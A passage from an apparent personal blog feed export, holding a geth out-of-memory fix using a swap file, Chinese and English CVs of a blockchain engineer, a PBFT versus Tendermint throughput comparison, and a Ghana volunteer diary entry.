&#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;proc.go:1229</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>【原因分析】<br>geth莫名其妙自动关闭，日志未呈现异常。此问题是因为服务器内存不足触发Linux的OOM killer操作，被杀掉了。<br>【解决方案】</p>
<ol>
<li>设置 –cache，并不能解决问题。</li>
<li>除了升级内存，没有太好的办法。只能依靠监控程序报警，发现问题重启即可。</li>
<li>需要在节点间设置 rpc 通信的白名单，防止黑客暴力破解 keystore 的密码。</li>
<li>其中折中的办法是设置swap。具体命令如下：</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">free -m</span><br><span class="line">dd if=/dev/zero of=/swap bs=10M count=800</span><br><span class="line">chmod 600 /swap</span><br><span class="line">ll /swap</span><br><span class="line">mkswap /swap</span><br><span class="line">swapon /swap</span><br><span class="line">swapon -s</span><br><span class="line">free -m</span><br></pre></td></tr></table></figure>

<p>相关链接：</p>
<ul>
<li><a href="https://github.com/ethereum/go-ethereum/issues/16377">https://github.com/ethereum/go-ethereum/issues/16377</a></li>
<li><a href="https://github.com/ethereum/go-ethereum/issues/15157">https://github.com/ethereum/go-ethereum/issues/15157</a></li>
</ul>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>cv-cn</title>
    <url>/1982/02/26/cv-cn/</url>
    <content><![CDATA[<center>
     <h1> 庄伟铭 </h1>
     <div>
         <span>
             <img src="/1982/02/26/cv-cn/phone-solid.svg" width="18px">
             18642696200
         </span>
         ·
         <span>
             <img src="/1982/02/26/cv-cn/wechat.svg" width="18px">
             zwm136200
         </span>
         ·
         <span>
             <img src="/1982/02/26/cv-cn/envelope-solid.svg" width="18px">
             zwm136200@gmail.com
         </span>
         ·
         <span>
             <img src="/1982/02/26/cv-cn/github-brands.svg" width="18px">
             <a href="https://github.com/zhuang-weiming">Weiming Zhuang</a>
         </span>
         ·
         <span>
             <img src="/1982/02/26/cv-cn/rss-solid.svg" width="18px">
             <a href="https://zhuang-weiming.github.io">Blog</a>
         </span>
     </div>
 </center>

<h2 id="重点介绍"><a href="#重点介绍" class="headerlink" title=" 重点介绍"></a><img src="/1982/02/26/cv-cn/tec.svg" width="30px"> 重点介绍</h2><p>​        超过15年系统技术研发和架构设计经验，熟悉<strong>分布式系统、金融科技、设计思维、流程设计及优化</strong>等领域关键技术。<strong>AI、区块链、移动、云计算、工作流</strong>等技术早期推广者、开源贡献者。在学术期刊和会议发表论文和演讲，申请专利十余项。同时负责过<strong>银行、保险、期货交易所</strong>等多家大型金融企业、多种业务IT方向的研发策略计划、系统/解决方案/算法设计、关键程序代码编写、项目（组合）管理、数字化转型、数据安全、合同、研发预算、IT治理、供应商、招聘、团队绩效等管理工作。</p>
<h2 id="主要背景"><a href="#主要背景" class="headerlink" title=" 主要背景"></a><img src="/1982/02/26/cv-cn/exp.svg" width="30px"> 主要背景</h2><p>​    2021.12~现在，汇丰银行，实验室首席工程师</p>
<p>​    2020.07~2021.12，大连商品交易所，创新实验室区块链负责人</p>
<p>​    2017.05~2020.07，上海保险交易所，任区块链研发负责人</p>
<p>​    2016.07~2017.05，蚂蚁金服，任职区块链底层研发专家</p>
<p>​    2010年10月，IBM自愿者活动，参加<a href="http://www.ibm.com/ibm/responsibility/corporateservicecorps/wwa_ghana.html">加纳政府咨询</a></p>
<p>​    2007.05~2016.07，IBM，任职创新技术高级顾问、区块链、移动、云技术工程师</p>
<p>​    2000.08~2007.05，大连海事大学，获得硕士、学士学位</p>
<h2 id="项目经历"><a href="#项目经历" class="headerlink" title=" 项目经历"></a><img src="/1982/02/26/cv-cn/project-diagram-solid.svg" width="30px"> 项目经历</h2><ul>
<li><p>汇丰集团，2021.12~现在，实验室首席工程师</p>
<p>汇丰实验室首席工程师，研究方向包括AI，Web3，监管科技，数字货币，大型团队/项目/质量管控，移动应用技术等，成功上线的项目包括：1）<a href="https://www.hkma.gov.hk/gb_chi/news-and-media/press-releases/2023/05/20230518-4/">e-HKD 数字港币</a>； 2）<a href="https://www.hangseng.com/cms/emkt/pmo/grp01/p88/chi/index.html">NFT亚洲数字银行</a>；3）<a href="https://www.red-dot.org/project/hsbc-trusted-identity-reimagine-identities-for-a-collaborative-world-72122">分布式数字身份</a>；4）UITest AI Robot；5）DeepSeek Fine-tune 等。日常工作还包括研发策略计划，数据安全，IT治理，人员招聘，团队管理，绩效评估，供应商选型等工作。技术主导的DID项目获得2024年Reward and Recognition HSBC奖项，设计获得红点奖。</p>
</li>
<li><p><a href="http://www.dce.com.cn/">大连商品交易所</a>飞创公司，2020.07~2021.12，创新实验室区块链负责人</p>
<p>交易所区块链技术负责人，负责区块链底层、DApp与治理的架构、设计以及核心代码编写等工作。成功研发大连商品交易所区块链产品，成功带领团队通过信通院第六批可信区块链测试。<a href="https://www.dl.gov.cn/art/2021/2/9/art_1186_525661.html">基于此区块链产品，联合交通银行、中粮集团，成功落地区块链仓单质押融资项目，目前运行平稳</a>。另外，针对交易所数据隐私交换的需求，本人完成多方安全计算平台的提案和导入。日常工作还包括研发策略计划，预算管理，供应商选型，数字化转型，数据安全，团队管理，人员招聘，绩效评估等工作。</p>
</li>
<li><p>上海保险交易所，2017.05~2020.07 金融科技研发负责人</p>
<p><a href="https://www.yicai.com/news/5256243.html">保交链</a>首席架构师、研发团队负责人以及核心代码编写人。带领团队完成专利21项，其中本人专利9项，并带领团队成功申请软件著作权12项。带领团队完成工信部信通院组织的区块链功能以及性能测试并顺利通过保交链测评。同时在区块链项目实施中担任架构师，完成难点重点项目设计，编写重点难点功能代码。荣获2018-2019年上海金融业改革发展优秀研究成果一等奖，上海市金融业联合会颁发。带领团队荣获<a href="https://www.iyiou.com/p/86401.html">2018</a><a href="https://www.iyiou.com/p/86401.html">上海区块链应用创新大赛一等奖</a>。日常工作还包括研发策略计划，预算管理，供应商选型，合同谈判，数字化转型，数据安全，团队管理，人员招聘等工作。</p>
</li>
<li><p>蚂蚁金服，2016.07~2017.05 专家</p>
<p>负责设计并编写第一代蚂蚁金服区块链平台，包括共识算法，通信协议，平台模型，技术选型等。<a href="http://cj.sina.com.cn/article/detail/2136703197/84145">代表蚂蚁金服参加工信部区块链开发者大会，并发言《区块链在社会公益领域的开发实践》</a>。</p>
</li>
<li><p>IBM，资深架构师，资深顾问</p>
<ul>
<li>Innovation center，2016.01~2016.07</li>
</ul>
</li>
<li><p>负责区块链提供解决方案，售前支持，带领开发团队完成PoC代码。负责的客户有农信银，工商银行，邮政储蓄银行，香港中银等。</p>
<ul>
<li>Innovation center，2015.01~2016.01</li>
</ul>
<p>负责移动和云解决方案提供解决方案，售前支持。参与工商银行，百联股份等客户现场支持。</p>
<ul>
<li>Consultant BU，2012.11~2015.01</li>
</ul>
<p>负责银行系统云升级项目。以及工业客户的财务，采购，报销，工单等业务流程以及系统的咨询和维护。</p>
<ul>
<li>E-Commerce Department，2012.02~2012.11</li>
</ul>
<p>开发电子商务系统，包括订单管理，商品分类，库存管理，电话下单中心的业务和设计。</p>
<ul>
<li><a href="https://zhuang-weiming.github.io/2010/11/04/ghana-day-29/">IBM CSC Program，2010.10</a></li>
</ul>
<p>参加IBM全球企业公民自愿者活动，在加纳用开展政府项目。负责为加纳旅游局做市场调查和业务分析，并为西部省区旅游市场计划做咨询，同时和3个国家的NGO组织一起组织实施和推进此市场计划。</p>
<ul>
<li>Accounts，2007.05~2012</li>
</ul>
<p>在多个项目中任软件工程师。负责在工作流平台。通常带领2～5个成员，组成团队，完成系统交付。</p>
</li>
</ul>
<h2 id="教育"><a href="#教育" class="headerlink" title=" 教育"></a><img src="/1982/02/26/cv-cn/graduation-cap-solid.svg" width="30px"> 教育</h2><p>大连海事大学 硕士 电力电子专业 2004.09~2007.05</p>
<p>大连海事大学 学士 电气工程专业 2000.08~2004.07</p>
<h2 id="成就"><a href="#成就" class="headerlink" title=" 成就"></a><img src="/1982/02/26/cv-cn/publish.svg" width="30px"> 成就</h2><ul>
<li>专利<ul>
<li><a href="https://patents.google.com/patent/WO2024011917A1/en">Delegate model for blockchain transactions (2022  CN, 2023  WO)</a> </li>
<li><a href="https://patents.google.com/patent/WO2024057150A1">User verification with non-fungible tokens (2023 WO US)</a> </li>
<li><a href="https://patents.google.com/patent/WO2018171539A1/en">Method and device for processing service request (2017 CN TW, 2018 PL WO ES MX RU KR BR JP CA AU EP, 2019 PH US)</a></li>
<li><a href="https://patents.google.com/patent/WO2018183148A1/en">Method, apparatus, and system for blockchain consensus (2017 CN TW, 2018 US KR RU SG MX JP WO CA BR AU EP, 2019 ZA PH AU, 2020 US, 2021 US)</a></li>
<li><a href="https://patents.google.com/patent/CN107622096A/en">Asynchronous multiparty data interaction method based on block chain system and storage medium (CN)</a></li>
<li><a href="https://patents.google.com/patent/CN109525636A/">Blockchain common recognition method based on Raft algorithm (CN)</a></li>
<li><a href="http://www.soopat.com/Patent/201910870075">用于更换区块链网络的领导者的方法和系统</a></li>
<li><a href="http://www.soopat.com/Patent/201910870384">区块链热升级的架构设计与实现</a></li>
<li><a href="http://www.soopat.com/Patent/201910873174">用于实现区块链的设备、方法、系统以及介质</a></li>
<li><a href="http://www.soopat.com/Patent/201910870084">用于向节点分配处理费用的方法、装置、系统和介质</a></li>
<li><a href="http://www.soopat.com/Patent/201910868276">用于区块链系统的压力测试的方法、介质和控制装置</a></li>
<li><a href="http://www.soopat.com/Patent/201910873181">基于区块链的网络连接及恢复机制</a></li>
<li><a href="http://www.soopat.com/Patent/201910874965">通过区块链管理保险代理人履历的方法、装置和可读介质</a></li>
<li><a href="http://www.soopat.com/Patent/201910870382">保险核保方法及系统和计算机存储介质</a></li>
</ul>
</li>
<li>论文<ul>
<li> <a href="http://www.sicris.cn/CN/abstract/abstract563.shtml">Research on Blockchain Application in Insurance Industry</a></li>
<li><a href="http://lib.cqvip.com/Qikan/Article/Detail?id=68748274504849574854485151">《中小型保险机构区块链应用实践》于当代金融家</a></li>
</ul>
</li>
<li>认证<ul>
<li>Secure Code Warrior certification, white / yellow / orange belt, highest level, 2022</li>
<li>大连市认定2020年城市发展紧缺人才</li>
<li>PMP Credential (2010-2013), PMP@ #: 1465859</li>
<li>Obtaining IREB CPRE Credential, 2012~</li>
<li>IBM certificated Experienced Level in IT Application Consulting &amp; Cross Industry specializations, 2014</li>
</ul>
</li>
<li>获奖<ul>
<li>荣获红点奖，<a href="https://www.red-dot.org/project/hsbc-trusted-identity-reimagine-identities-for-a-collaborative-world-72122">HSBC Trusted Identity - Reimagine Identities For A Collaborative World</a></li>
<li>荣获HSBC Tech 2024年Reward &amp; Recognition Winners奖项</li>
<li>荣获2018-2019年上海金融业改革发展优秀研究成果一等奖，上海市金融业联合会颁发</li>
<li>带领团队荣获2018上海区块链应用创新大赛一等奖</li>
<li>2018年带领技术团队通过工信部信通院的区块链功能以及性能测试</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>cv</tag>
      </tags>
  </entry>
  <entry>
    <title>PBFT性能到底如何</title>
    <url>/2023/09/05/PBFT%E6%80%A7%E8%83%BD%E5%88%B0%E5%BA%95%E5%A6%82%E4%BD%95/</url>
    <content><![CDATA[<h4 id="1-PBFT-https-github-com-yeasy-blockchain-guide-blob-master-evaluation-hyperledger-md"><a href="#1-PBFT-https-github-com-yeasy-blockchain-guide-blob-master-evaluation-hyperledger-md" class="headerlink" title="1. PBFT  https://github.com/yeasy/blockchain_guide/blob/master/evaluation/hyperledger.md"></a>1. PBFT  <a href="https://github.com/yeasy/blockchain_guide/blob/master/evaluation/hyperledger.md">https://github.com/yeasy/blockchain_guide/blob/master/evaluation/hyperledger.md</a></h4><h3 id="Hyperledger-Fabric-v0-6-PBFT-性能评测"><a href="#Hyperledger-Fabric-v0-6-PBFT-性能评测" class="headerlink" title="Hyperledger Fabric v0.6 - PBFT 性能评测"></a>Hyperledger Fabric v0.6 - PBFT 性能评测</h3><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><table>
<thead>
<tr>
<th>类型</th>
<th>操作系统</th>
<th>内核版本</th>
<th>CPU(GHz)</th>
<th>内存(GB)</th>
</tr>
</thead>
<tbody><tr>
<td>物理机</td>
<td>Ubuntu 14.04.1</td>
<td>3.16.0-71-generic</td>
<td>4x2.0</td>
<td>8</td>
</tr>
</tbody></table>
<p>每个集群启动后等待 10s 以上，待状态稳定。</p>
<p>仅测试单客户端、单服务端的连接性能情况。</p>
<h3 id="评测指标"><a href="#评测指标" class="headerlink" title="评测指标"></a>评测指标</h3><p>一般评测系统性能指标包括吞吐量（throughput）和延迟（latency）。对于区块链平台系统来说，实际交易延迟包括客户端到系统延迟（往往经过互联网），再加上系统处理反馈延迟（跟不同 consensus 算法关系很大，跟集群之间互联系统关系也很大）。</p>
<p>本次测试仅给出大家最为关注的交易吞吐量（tps）。</p>
<h4 id="query-交易"><a href="#query-交易" class="headerlink" title="query 交易"></a>query 交易</h4><h5 id="pbft-classic"><a href="#pbft-classic" class="headerlink" title="pbft:classic"></a>pbft:classic</h5><table>
<thead>
<tr>
<th>clients</th>
<th>VP Nodes</th>
<th>iteration</th>
<th>tps</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>4</td>
<td>2000</td>
<td>193.05</td>
</tr>
</tbody></table>
<h5 id="pbft-batch"><a href="#pbft-batch" class="headerlink" title="pbft:batch"></a>pbft:batch</h5><table>
<thead>
<tr>
<th>clients</th>
<th>VP Nodes</th>
<th>batch size</th>
<th>iteration</th>
<th>tps</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>4</td>
<td>2</td>
<td>2000</td>
<td>193.99</td>
</tr>
<tr>
<td>1</td>
<td>4</td>
<td>4</td>
<td>2000</td>
<td>192.49</td>
</tr>
<tr>
<td>1</td>
<td>4</td>
<td>8</td>
<td>2000</td>
<td>192.68</td>
</tr>
</tbody></table>
<h4 id="invoke-交易"><a href="#invoke-交易" class="headerlink" title="invoke 交易"></a>invoke 交易</h4><h5 id="pbft-classic-1"><a href="#pbft-classic-1" class="headerlink" title="pbft:classic"></a>pbft:classic</h5><table>
<thead>
<tr>
<th>clients</th>
<th>VP Nodes</th>
<th>iteration</th>
<th>tps</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>4</td>
<td>2000</td>
<td>141.34</td>
</tr>
</tbody></table>
<h5 id="pbft-batch-1"><a href="#pbft-batch-1" class="headerlink" title="pbft:batch"></a>pbft:batch</h5><table>
<thead>
<tr>
<th>clients</th>
<th>VP Nodes</th>
<th>batch size</th>
<th>iteration</th>
<th>tps</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>4</td>
<td>2</td>
<td>2000</td>
<td>214.36</td>
</tr>
<tr>
<td>1</td>
<td>4</td>
<td>4</td>
<td>2000</td>
<td>227.53</td>
</tr>
<tr>
<td>1</td>
<td>4</td>
<td>8</td>
<td>2000</td>
<td>237.81</td>
</tr>
</tbody></table>
<h3 id="PBFT结论"><a href="#PBFT结论" class="headerlink" title="PBFT结论"></a>PBFT结论</h3><p>PBFT单客户端连接情况下，TPS 基本在 190 ~ 300 范围内。</p>
<p>============================================</p>
<h4 id="2-tendermint-https-www-inf-usi-ch-faculty-pedone-Paper-2021-srds2021a-pdf"><a href="#2-tendermint-https-www-inf-usi-ch-faculty-pedone-Paper-2021-srds2021a-pdf" class="headerlink" title="2.tendermint https://www.inf.usi.ch/faculty/pedone/Paper/2021/srds2021a.pdf"></a>2.tendermint <a href="https://www.inf.usi.ch/faculty/pedone/Paper/2021/srds2021a.pdf">https://www.inf.usi.ch/faculty/pedone/Paper/2021/srds2021a.pdf</a></h4><p>我们使用 Tendermint 版本 0.33.8 和 Go 版本 1.15，使用默认配置。 内存池最多可存储5000笔交易，最大字节大小为1GB，块大小为20MB。 这些默认限制足以应付未完成交易的最大数量。两个都连接的最大发送和接收速率为 5000 KB/s，控制gossip通信的时间间隔是 100 毫秒。<br>我们在地理分布式环境中进行了实验，验证器节点均匀分布在各大洲的 16 个 AWS 区域中。另一个 AWS 实例托管 1 个以种子模式运行的非验证器节点和所有客户端。<br>我们将所有客户端托管在单个 AWS 服务器中，以将所有测量集中在一个位置。客户端在闭环中均匀地向验证器提交 1KB 交易。<br><img src="/2023/09/05/PBFT%E6%80%A7%E8%83%BD%E5%88%B0%E5%BA%95%E5%A6%82%E4%BD%95/1.png"><br>图中比较了 Tendermint 在 16、32、64 和 128 个验证者规模下的性能。 我们并不期望通过增加验证器的数量来提高性能，因为消息复杂性和共识成本随着进程数量的增加而增加。 本次比较中使用了 128 个验证器的参考工作负载，在实验中的验证器之间均匀分配 1536 个客户端。 采用了第 VII-B 节中考虑的相同实验设置。图中，在相同的工作负载下，当我们将验证器数量增加一倍时，吞吐量会适度下降。</p>
<h3 id="Tendermint结论"><a href="#Tendermint结论" class="headerlink" title="Tendermint结论"></a>Tendermint结论</h3><p>Tendermint 的 TPS 基本在 400 ~ 600 范围内。交易延时在2～4秒。</p>
<p>根据以上性能数据，可以在设计区块链系统时，预先分析得出系统综合来看，性能瓶颈到底在哪里。如，某些外部的SaaS服务，性能可能会低于上述区块链指标，从而拖累系统的整体性能。</p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>ghana day 15</title>
    <url>/2010/10/17/ghana-day-15/</url>
    <content><![CDATA[<p>It’s now mid-October, and we’ve been heading to the Ghana Tourist Board (GTB) daily at around 8:20 AM. According to our schedule, Anouk and I have conducted training for four individuals in Excel, two in Windows and Word, and six in PowerPoint.</p>
<p>One particularly memorable moment was when I first assisted Michael, my initial student. He was thrilled to learn about the computer’s capabilities – editing words, performing calculations, surfing the internet, chatting, and connecting with people worldwide. His eyes sparkled with excitement. Today, we conducted PowerPoint and Excel training for the president and director of GTB, Mr. Hammond. Having worked at GTB for over 28 years, Mr. Hammond possesses a clear vision for the organization’s future and is a smart, quick learner. He immediately grasped the PowerPoint functions during his first practice session. However, during our Excel training, we noticed that slight movements of the mouse could significantly alter the content. Therefore, sometimes we worked hand in hand to practice together.</p>
<p><img src="/2010/10/17/ghana-day-15/1.jpg"></p>
<p><img src="/2010/10/17/ghana-day-15/2.jpg"></p>
<p>President of GTB  Training in Manager office</p>
<p>Next week, on October 20th, we will conclude the computer training at GTB. Additionally, we are facilitating a workshop, a collaborative effort between NGOs and GTB. Presently, under this market plan, GTB and the NGOs aim to establish a Destination Management Organization (DMO). The forthcoming step involves organizing training to familiarize the DMO with its management responsibilities, which will contribute to the development of the ‘Destination Management Plan for Ghana’s West Coast.’ This initiative has enabled members of the steering committee to interact for the first time, fostering stronger connections between the private and public sectors beyond the conventional licensing and control dynamics. The private sector, particularly the beach resorts, has been structured into an association to represent common interests, allowing for a platform to discuss issues and share perspectives. We are hopeful that the workshop on October 22nd will significantly advance the Marketing and Product Development Strategy for Ghana’s West Coast.</p>
]]></content>
      <tags>
        <tag>CSC</tag>
        <tag>Ghana</tag>
      </tags>
  </entry>
  <entry>
    <title>cv-en</title>
    <url>/1982/02/26/cv-en/</url>
    <content><![CDATA[<center>
     <h1>WEIMING ZHUANG</h1>
     <div>
         <span>
             <img src="/1982/02/26/cv-en/phone-solid.svg" width="18px">
             18642696200
         </span>
         ·
         <span>
             <img src="/1982/02/26/cv-en/wechat.svg" width="18px">
             zwm136200
         </span>
         ·
         <span>
             <img src="/1982/02/26/cv-en/envelope-solid.svg" width="18px">
             zwm136200@gmail.com
         </span>
         ·
         <span>
             <img src="/1982/02/26/cv-en/github-brands.svg" width="18px">
             <a href="https://github.com/zhuang-weiming">Weiming Zhuang</a>
         </span>
         ·
         <span>
             <img src="/1982/02/26/cv-en/rss-solid.svg" width="18px">
             <a href="https://zhuang-weiming.github.io">Blog</a>
         </span>
     </div>
 </center>

<h2 id="Summary"><a href="#Summary" class="headerlink" title=" Summary"></a><img src="/1982/02/26/cv-en/tec.svg" width="30px"> Summary</h2><ul>
<li>Extensive expertise in system technology research and development, architecture design, and technologies spanning distributed systems, financial system technology, design thinking, process design, and optimization.</li>
<li>Early adopter and open-source contributor to blockchain, mobile, workflow, cloud, and other cutting edge technologies. Authored research papers and delivered presentations at leading academic journals and conferences. Holder of over ten patent filings.</li>
<li>Played a pivotal leading role in corporate IT R&amp;D strategic planning, solution/system/algorithm design, key program code development, project (portfolio) management, digital transformation, data security, contract negotiation, R&amp;D budget allocation, IT governance, vendor management, hiring, team leadership, and other management responsibilities.</li>
</ul>
<h2 id="Experiences"><a href="#Experiences" class="headerlink" title=" Experiences"></a><img src="/1982/02/26/cv-en/exp.svg" width="30px"> Experiences</h2><ul>
<li><p><strong><a href="https://www.ventures.hsbc.com/en/open">HSBC</a> / Dec 2021 / Lead Full Stack Engineer</strong><br>As engineering lead in HSBC Lab I focus on innovative technologies, including CBDC, web 3.0, AI, mobile, regulatory technology, cloud, and others. I lead related strategic planning / daily R&amp;D progress / vendor development / data security / team leadership / hiring and performance reviews. I gained a comprehensive understanding of the banking system in this period. I lead DID project and win the 2024 Reward and Recognition of HSBC, our Designer wins Red Dot Award.<br>Successfully initiated and spearheaded external HSBC public projects, including 1) <a href="https://www.hkma.gov.hk/gb_chi/news-and-media/press-releases/2023/05/20230518-4/">e-HKD</a>; 2) <a href="https://www.hangseng.com/cms/emkt/pmo/grp01/p88/chi/index.html">NFT</a>; 3) <a href="https://www.red-dot.org/project/hsbc-trusted-identity-reimagine-identities-for-a-collaborative-world-72122">Decentralized Identity</a>; 4) UITest AI Robot; 5) DeepSeek fine-tuning.</p>
</li>
<li><p><strong><a href="https://www.dfitc.com.cn/">Dalian Commodity Exchange</a> / Jul 2020 ~ Dec 2021 / Lead Architect</strong><br>As the DCE lab lead, Principal Programmer, I was focusing of blockchain, DApps, and Alliance Governance in Commodity Trading, I successfully led the launch of Dalian Commodity Exchange’s blockchain. Additionally, I guided our team to pass the sixth wave of Trusted Blockchain Tests conducted by CAICT(The China Academy of Information and Communications Technology) (<a href="https://www.dljrylhh.org.cn/gzdt/2021-11-18/705.html">source</a>). My role also encompassed leading strategic planning, budgeting, contract negotiation, digital transformation, team leadership, hiring and performance reviews, and vendor management. Leveraging this blockchain product, the Bank of Communications and COFCO initiated a blockchain warehouse receipt pledge financing project, which is currently operating successfully (<a href="https://finance.sina.com.cn/money/future/fmnews/2021-04-08/doc-ikmxzfmk5614473.shtml">source</a>). In addition, in response to the needs of exchanges for data privacy exchange, I completed the proposal and import a multi-party secure computing platform onboard. I gained a comprehensive understanding of the commodity futures exchange system in this period.</p>
</li>
<li><h5 id="Shanghai-Insurance-Exchange-Apr-2017-Jun-2020-Technical-Lead"><a href="#Shanghai-Insurance-Exchange-Apr-2017-Jun-2020-Technical-Lead" class="headerlink" title="Shanghai Insurance Exchange / Apr 2017 ~ Jun 2020 / Technical Lead"></a><a href="https://www.shie.com.cn/">Shanghai Insurance Exchange</a> / Apr 2017 ~ Jun 2020 / Technical Lead</h5><p>As the Principal Architect and core Programmer, I led the engineering team to research and develope a blockchain product - SHIE Blockchain, and it successfully passed the CAICT(The China Academy of Information and Communications Technology) rating in the 1st wave. My responsibilities also included directing overall technology strategy and execution, driving innovation in insurance companies, designing solutions, and leading project delivery with partners. Additionally, I spearheaded strategic planning, budgeting, contract negotiations, digital transformation, team leadership, hiring, and vendor management.<br>Innovation team development the applications on reinsurance, digital insurance policies, digital customer identification in insurance, insurance policy pledges, and supplementary pension insurance assets. We won the first prize in the Shanghai Innovation and Entrepreneurship Competition 2018. I am also featured in <a href="https://www.shie.com.cn/iec/iecPC.html">SHIE Chain News I</a> and <a href="http://xueshu.baidu.com/s?wd=paperuri:(4d51a8c9eef67cf1e7f2f695ec2dd533)&filter=sc_long_sign&sc_ks_para=q=%E6%B5%85%E6%9E%90%E4%BF%9D%E4%BA%A4%E6%89%80%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82%E4%BF%9D%E4%BA%A4%E9%93%BE%E5%8F%91%E5%B1%95%E7%8E%B0%E7%8A%B6&tn=SE_baiduxueshu_c1gjeupa&ie=utf-8&sc_us=9951575790124435309">SHIE Chain News II</a>, where my work and insights in the field are discussed. I gained a valuable understanding of the insurance system in this period.</p>
</li>
<li><h5 id="Ant-Financial-Jul-2016-Mar-2017-Blockchain-Expert"><a href="#Ant-Financial-Jul-2016-Mar-2017-Blockchain-Expert" class="headerlink" title="Ant Financial / Jul 2016 ~ Mar 2017 / Blockchain Expert"></a><a href="https://www.antgroup.com/">Ant Financial</a> / Jul 2016 ~ Mar 2017 / Blockchain Expert</h5><p>I am an Architect and Designer, as well as the Principal Coder of the Ant Chain platform, where we developed a application for charitable donations and go live. My expertise also extends to being a Consensus Algorithm Designer and Programmer. Additionally, I had the honor of representing Ant Financial as a speaker at the Blockchain Conference organized by the Ministry of Industry and Information Technology (MIIT) (<a href="http://cj.sina.com.cn/article/detail/2136703197/84145">source</a>). I gained valuable understanding of the large cloud-based microservice system and the culture of internet companies in this period.</p>
</li>
<li><h5 id="IBM-May-2007-Jul-2016-Innovation-Senior-Architect-Engineer"><a href="#IBM-May-2007-Jul-2016-Innovation-Senior-Architect-Engineer" class="headerlink" title="IBM / May 2007 ~ Jul 2016 / Innovation , Senior Architect, Engineer"></a><a href="https://www.ibm.com/">IBM</a> / May 2007 ~ Jul 2016 / Innovation , Senior Architect, Engineer</h5><p>In 2016, at the IBM GBS Innovation Center, I was the 1st blockchain developer and consultant. I spearheaded pilot blockchain POCs for ICBC (Industrial and Commercial Bank of China), developed MVPs for the Rural Credit Banks Funds Clearing Center and Postal Savings Bank of China, and provided blockchain training for Bank of China (Hong Kong).<br>In 2014&amp;2015, within the IBM Innovation Center, I was the coach and developer of IBM’s mobile and cloud garage - IBM studio. I was also the iOS developer and designer of pilot mobile MVPs for ICBC and BL.COM.<br>I obtained the IBM certificated Experienced Level in IT Application Consulting &amp; Cross Industry specializations from 2014, and certification of Project Management Professional from 2010. Additionally, I was a volunteer in the <a href="https://zhuang-weiming.github.io/2010/11/04/ghana-day-29/">IBM CSC Program in October 2010</a>, Ghana Team 5.</p>
</li>
</ul>
<h2 id="Education"><a href="#Education" class="headerlink" title=" Education"></a><img src="/1982/02/26/cv-en/graduation-cap-solid.svg" width="30px"> Education</h2><p>Dalian Maritime University, Obtained Master and Bachelor of Electrical Engineering in 2000 ~ 2007.</p>
<h2 id="Accomplishments"><a href="#Accomplishments" class="headerlink" title=" Accomplishments"></a><img src="/1982/02/26/cv-en/publish.svg" width="30px"> Accomplishments</h2><ul>
<li><h5 id="Applied-patents-total-13"><a href="#Applied-patents-total-13" class="headerlink" title="Applied patents (total 13)"></a>Applied patents (total 13)</h5><ul>
<li><a href="https://patents.google.com/patent/WO2024011917A1/en">Delegate model for blockchain transactions (2022  CN, 2023  WO)</a> </li>
<li><a href="https://patents.google.com/patent/WO2024057150A1">User verification with non-fungible tokens (2023 WO US)</a> </li>
<li><a href="https://patents.google.com/patent/WO2018171539A1/en">Method and device for processing service request (2017  CN TW 2018  MY WO ES KR AU MX RU CA PL EP JP 2019  PH US)</a></li>
<li><a href="https://patents.google.com/patent/WO2018183148A1/en">Method, apparatus, and system for blockchain consensus (2017  CN TW 2018  MX KR WO SG EP AU US JP CA BR RU 2019  ZA PH AU 2020  US 2021  US)</a></li>
<li><a href="https://patents.google.com/patent/CN107622096A/en">Asynchronous multiparty data interaction method based on block chain system and storage medium (CN)</a></li>
<li><a href="https://patents.google.com/patent/CN109525636A/">Blockchain common recognition method based on Raft algorithm (CN)</a></li>
<li><a href="http://www.soopat.com/Patent/201910870075">Method and system for replacing leader of blockchain network</a></li>
<li><a href="http://www.soopat.com/Patent/201910870384">Architecture design and implementation of blockchain hot upgrading</a></li>
<li><a href="http://www.soopat.com/Patent/201910873174">Device, method and system for realizing blockchain, and medium</a>, </li>
<li><a href="http://www.soopat.com/Patent/201910870382">Insurance underwriting method and system and computer storage medium</a>, etc.</li>
</ul>
</li>
<li><h5 id="Publications"><a href="#Publications" class="headerlink" title="Publications"></a>Publications</h5><ul>
<li> <a href="http://journal09.magtech.org.cn/Jwk_xxaqyj/CN/Y2019/V5/I3/207">Research on Blockchain Application in Insurance Industry</a></li>
<li> <a href="http://lib.cqvip.com/Qikan/Article/Detail?id=68748274504849574854485151">Blockchain Practical Application Methodology in Small and Middle Insurance Enterprise on “Modern Bankers”</a></li>
</ul>
</li>
<li><h5 id="Credential"><a href="#Credential" class="headerlink" title="Credential"></a>Credential</h5><ul>
<li>Secure Code Warrior certification, orange belt - highest level, 2022</li>
<li>Certificated expertise of Dalian 2020 urgent need for talent certification programs</li>
<li>PMP Credential (2010-2013), PMP@ #: 1465859</li>
<li>Obtaining IREB CPRE Credential from 2012</li>
<li>IBM certificated Experienced Level in IT Application Consulting &amp; Cross Industry specializations, 2014</li>
</ul>
</li>
<li><h5 id="Honor-amp-Award"><a href="#Honor-amp-Award" class="headerlink" title="Honor &amp; Award"></a>Honor &amp; Award</h5><ul>
<li>Coach team to win the prestigious <a href="https://www.red-dot.org/project/hsbc-trusted-identity-reimagine-identities-for-a-collaborative-world-72122">Red Dot Award for Decentralised Identity (DiD)</a></li>
<li>Lead team to win the HSBC Tech 2024 Reward &amp; Recognition, HSBC Tech Code Competition champion and runner-up</li>
<li>First Prize of Outstanding Research Achievements in the Reform and Development of Shanghai’s Financial Industry 2018-2019</li>
<li>First prize of 2018 Shanghai Blockchain Innovation Competition</li>
<li>Leader of team passed the blockchain function and performance rating by CAICT, 2018, 2021</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>cv</tag>
      </tags>
  </entry>
  <entry>
    <title>ghana day 21</title>
    <url>/2010/10/23/ghana-day-21/</url>
